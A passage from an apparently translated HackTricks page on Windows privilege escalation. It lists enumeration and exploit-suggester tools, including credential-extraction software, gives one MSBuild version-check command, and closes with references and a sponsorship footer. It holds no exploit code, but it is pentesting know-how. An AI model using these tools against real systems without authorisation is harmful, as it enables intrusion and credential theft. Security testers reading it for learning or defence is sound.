[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~~~**~~ -- 搜索已知的权限提升漏洞（已弃用，推荐使用Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **（需要管理员权限）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的权限提升漏洞（需要使用VisualStudio编译）（[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机搜索配置错误（更多是信息收集工具而非权限提升）（需要编译） **(**[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从许多软件中提取凭证（github中有预编译的exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp的C#版本**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~~~**~~ -- 检查配置错误（github中有预编译的可执行文件）。不推荐。在Win10中工作不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的配置错误（来自python的exe）。不推荐。在Win10中工作不佳。

**Bat**

[**winPEASbat**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) -- 基于本文创建的工具（它不需要accesschk正常工作，但可以使用它）。

**本地**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取**systeminfo**的输出并推荐有效的漏洞利用（本地python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取**systeminfo**的输出并推荐有效的漏洞利用（本地python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确的.NET版本编译项目（[参见此处](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上安装的.NET版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**中看到您的**公司广告**，或者想要访问**最新版本的PEASS或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**hacktricks仓库**](https://github.com/carlospolop/hacktricks)和[**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud)提交PR来**分享您的黑客技巧**。

</details>
